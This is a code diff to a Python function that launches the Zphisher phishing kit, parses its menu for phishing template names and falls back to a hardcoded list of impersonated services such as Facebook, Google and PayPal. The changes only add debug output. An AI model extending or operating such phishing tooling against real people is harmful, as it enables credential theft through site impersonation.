@@ -211,6 +211,8 @@ def fetch_zphisher_templates():
     try:
         proc = subprocess.Popen(['bash', ZPHISHER_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
         output, _ = proc.communicate(timeout=20)
+        print("Zphisher raw output for template fetch:")
+        print(output)
         templates = []
         # Try to match [1] Facebook, 1) Facebook, or 1. Facebook
         regexes = [
@@ -226,10 +228,9 @@ def fetch_zphisher_templates():
                     break
             if any(x in line for x in ["Select An Attack", "Select an option", "Enter your choice"]):
                 break
+        print("Parsed templates:", templates)
         if not templates:
-            print("Zphisher template parse failed. Raw output:")
-            print(output)
-            # Fallback to hardcoded list
+            print("No templates found. Using fallback.")
             return [
                 "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
                 "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
@@ -239,7 +240,6 @@ def fetch_zphisher_templates():
         return templates
     except Exception as e:
         print(f"Zphisher template fetch error: {e}")
-        # Fallback to hardcoded list
         return [
             "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
             "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
